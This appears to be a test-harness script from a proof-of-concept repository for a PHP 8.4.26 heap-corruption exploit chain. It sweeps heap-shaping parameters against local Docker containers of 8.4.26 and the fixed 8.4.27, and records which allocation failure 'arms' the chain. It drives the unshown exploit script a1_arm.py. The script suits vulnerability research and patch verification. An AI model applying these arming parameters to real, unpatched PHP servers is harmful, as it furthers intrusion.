#!/bin/bash
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

# shape_sweep.sh - regenerate the 8.4.26 vs 8.4.27 comparison table from docs/NEGATIVE_CONTROL_8.4.27.md
#
# Every point is run on both builds, one fresh container per point: the arming depends on the state of a
# clean heap, so re-using a container would measure the previous request instead of the shape.
#
# The interesting number is not "did it fail" but *which allocation failed*. Only a one-page (4096)
# failure at the disclosure encoder leaves the state the chain needs; 12288, 8192, 20480 or a 2 MiB
# chunk failure are different sites that happen to also end the request.
#
#   ./poc/shape_sweep.sh                     # both builds, ~15 minutes
#   ./poc/shape_sweep.sh --only 8.4.27       # one build
set -u

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
ROOT=$(cd "$HERE/.." && pwd)
cd "$ROOT" || exit 1

POS_IMAGE=${POS_IMAGE:-php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a}
NEG_IMAGE=${NEG_IMAGE:-php:8.4.27-apache}
POS_PORT=${POS_PORT:-18130}
NEG_PORT=${NEG_PORT:-18131}
NAME=p2s-shape
ONLY=""

while [ $# -gt 0 ]; do
  case "$1" in
    --only) ONLY="$2"; shift 2 ;;
    *) echo "usage: $0 [--only 8.4.26|8.4.27]" >&2; exit 2 ;;
  esac
done

command -v docker >/dev/null 2>&1 || { echo "docker not found" >&2; exit 1; }

# run_point <image> <port> <a1_arm args...>
run_point() {
  local img="$1" port="$2"; shift 2
  docker rm -f $NAME >/dev/null 2>&1
  IMAGE="$img" NAME=$NAME PORT="$port" bash lab/start_target.sh --single >/dev/null 2>&1
  local out status oom cookie
  out=$(python3 poc/a1_arm.py --url "http://127.0.0.1:$port/index.php" --repeat 1 --sid-hex 00 \
        --query-n 5 --query-len 1 --timeout 240 "$@" 2>&1)
  status=$(echo "$out" | sed -n 's/.*-> \(HTTP\/[0-9.]* [0-9]*\).*/\1/p' | head -1)
  [ -z "$status" ] && status="(none)"
  # A Set-Cookie with a 32-hex id is a normal session; nothing at all means startup abandoned parsing.
  cookie=$(echo "$out" | grep -cE 'Set-Cookie: PHPSESSID=[0-9a-f]{32}')
  oom=$(docker logs --tail 6 $NAME 2>&1 | grep -oE 'tried to allocate [0-9]+' \
        | sed 's/tried to allocate //' | sort -n -u | tr '\n' ',' | sed 's/,$//')
  local verdict
  case "$oom" in
    4096) verdict="**OOM 4096 - arms**" ;;
    "")   verdict="no OOM" ;;
    *)    verdict="OOM $oom" ;;
  esac
  [ "$cookie" -eq 0 ] && verdict="$verdict, no cookie"
  echo "$verdict"
}

point() { # label a1_arm args...
  local label="$1"; shift
  local pos="-" neg="-"
  if [ -z "$ONLY" ] || [ "$ONLY" = "8.4.26" ]; then pos=$(run_point "$POS_IMAGE" "$POS_PORT" "$@"); fi
  if [ -z "$ONLY" ] || [ "$ONLY" = "8.4.27" ]; then neg=$(run_point "$NEG_IMAGE" "$NEG_PORT" "$@"); fi
  printf '| %-34s | %-40s | %-40s |\n' "$label" "$pos" "$neg"
}

echo "| shape | 8.4.26 | 8.4.27 |"
echo "|---|---|---|"
point "--big 70"        --big 70
point "--big 76"        --big 76
point "--big 78"        --big 78
point "--big 90"        --big 90
point "--big 125"       --big 125
point "--big 500"       --big 500
point "--depth 16"      --big 78 --depth 16
point "--depth 48"      --big 78 --depth 48
point "--depth 62"      --big 78 --depth 62
point "--depth 64"      --big 78 --depth 64
point "--parts 200"     --big 78 --parts 200
point "--parts 600"     --big 78 --parts 600
point "--parts 860"     --big 78 --parts 860
point "--parts 950"     --big 78 --parts 950
point "--parts 2000"    --big 78 --parts 2000
point "--big-len 16000" --big 78 --big-len 16000
point "--big-len 64000" --big 78 --big-len 64000

echo
echo "memory_limit and the raised-limits points are in poc/negative_control.sh (sweep) and"
echo "docs/NEGATIVE_CONTROL_8.4.27.md."
